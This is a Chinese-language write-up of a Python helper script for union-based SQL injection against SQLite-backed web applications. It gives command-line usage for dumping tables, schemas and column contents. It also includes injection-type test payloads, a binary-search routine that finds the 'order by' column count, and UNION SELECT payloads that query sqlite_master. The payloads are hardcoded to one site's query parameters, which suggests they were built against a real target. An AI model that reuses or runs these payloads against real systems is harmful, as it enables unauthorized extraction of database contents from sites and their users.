
Sqlite联合注入辅助脚本

0×01概述：

SQLite是一款轻型的数据库。sqlite存在一个叫SQLITE_MASTER的表，这与MySQL5.x的INFORMATION_SCHEMA表类似。sqlite_master 表中保存了数据库中所有表的信息，该表中比较有用的字段有“name,sql”，name字段存放的是表名，sql字段存放的是表结构。可以通过内置函数sqlite_version()获取版本信息，和其他数据库一样，通过“order by”判断长度，该数据库的注释符和ORACLE数据库一样，都是--。

0×02使用参数：
  
  python sqlite.py -u url --tables＃获取所有表名
  
  python sqlite.py -u url --columns＃获取所有表结构，从而获取字段值
  
  python sqlite.py -u url -T table_name -C column_name -d＃获取指定字段内容

0×03：信息获取

通过自定义函数SetPoc，根据功能需求，设置各发包的PoC，比如猜测“order by”长度，获取版本信息，获取表名，获取表中字段名，以及字段的具体内容。
首先判断注入类型，是整型（123和555 = 555--），字符型（123'和555 = 555--），还是搜索型（123％'和555 = 555--），再通过二分法判断“order by”长度，如果一开始插入order by mid（尝试的长度）的包返回状态和正常的原始包返回状态不相等，则说明mid过大，如果原始正常包返回状态与插入的order by mid和order by mid + 1的包返回状态相等，则说明mid过小，如果原始正常包返回状态与插入order by mid的返回包状态相等，但与order by mid + 1的包返回状态不相等，则成功获取order by长度。

def SetPoc(self, action):

        # 获取order by 数目的poc
        if action == "orderby":
            poc0 = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同" \
                   "&q=&pageIndex=1&searchname=&_=1522659952172"
            poc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') "
            poc_end = "--&q=&pageIndex=1&searchname=&_=1522659952172"
            response0 = SendData(target, poc0)
            min = 0
            max = self.OrderBy
            middle = (max+min) / 2
            while self.OrderBy > 0:
                ordpoc1 = (poc_start + "order by {0}" + poc_end).format(middle)
                ordpoc2 = (poc_start + "order by {0}" + poc_end).format(middle + 1)
                response1 = SendData(target, ordpoc1)
                response2 = SendData(target, ordpoc2)
                if response0.status_code != response1.status_code:
                    max = middle
                    middle = (min+max) / 2
                else:
                    if response1.status_code == response2.status_code:
                        
                        if response1.status_code == 200:
                            min = middle
                            middle = (min+max) / 2
                        else:
                            max = middle
                            middle = (min+max) / 2
                    else:
                        self.OrderBy = middle
                        print ("》Order By number is %s" % self.OrderBy)
                        break   


通过调用count(1)可获取数据库中表的总数，通过查询系统表SQLITE_MASTER中的name字段，可获取数据库中所有表名，这和MySQL数据库中系统表INFORMATION_SCHEMA中的“table_name”字段类似。通过limit关键字指定获取信息的开始位置和数量，比如limit 0,1，则是从第一条开始，并且只获取一条数据

        # 获取表数量的poc
        elif action == "tabnum":
            tabnumpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                          "and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
            tabnumpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659952172"
            tabnumpoc = tabnumpoc_start + self.poc_mid + tabnumpoc_end
            return tabnumpoc
